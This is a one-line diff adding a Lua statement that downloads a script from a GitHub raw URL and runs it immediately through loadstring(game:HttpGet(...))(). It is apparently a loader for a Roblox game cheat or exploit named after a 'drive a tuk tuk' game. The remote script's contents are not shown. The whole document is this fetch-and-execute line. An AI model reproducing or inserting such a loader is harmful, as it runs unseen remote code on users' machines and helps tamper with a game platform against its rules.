@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/drive-a-tuk-tuk-spam5-jg8dtsvqianwf6.lua"))()
